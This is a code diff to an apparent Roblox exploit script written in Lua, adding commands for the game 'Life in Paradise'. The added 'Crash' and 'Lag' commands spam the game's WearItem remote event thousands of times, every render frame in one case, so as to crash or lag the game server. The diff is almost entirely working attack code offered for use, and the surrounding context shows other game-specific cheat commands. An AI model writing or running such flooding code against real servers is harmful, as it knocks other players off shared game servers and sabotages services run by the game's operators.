@@ -2962,6 +2962,63 @@ function modules.UniversalCommands()
 				end,
 			})
 		end)
+		loadSupportedGame(1662219031, "Life in Paradise", function()
+			local wearItem = self.Services.ReplicatedStorage:WaitForChild("WearItem")
+			
+			self:AddCommand({
+				Name = "Crash",
+				Description = "Crashes the server",
+
+				Aliases = {},
+				Arguments = {},
+
+				Function = function(speaker, args)
+					-- 引数 --
+
+					-- 変数 --
+
+					-- 関数 --
+					self.Services.RunService.RenderStepped:Connect(function()
+						self.spawn(function()
+							for i = 1, 1000 do
+								wearItem:FireServer({
+									[1] = "Wear",
+									[2] = "11297746",
+									[3] = "Hats"
+								})
+							end
+						end)
+					end)
+
+				end,
+			})
+			
+			self:AddCommand({
+				Name = "Lag",
+				Description = "Lags the server",
+
+				Aliases = {},
+				Arguments = {},
+
+				Function = function(speaker, args)
+					-- 引数 --
+
+					-- 変数 --
+
+					-- 関数 --
+					for i = 1, 3500 do
+						self.spawn(function()
+							wearItem:FireServer({
+								[1] = "Wear",
+								[2] = "11297746",
+								[3] = "Hats"
+							})
+						end)
+					end
+
+				end,
+			})
+		end)
 		loadSupportedGame(662417684, "Lucky Block Battle Grounds", function()
 			self:AddCommand({
 				Name = "GiveLuckyBlock",
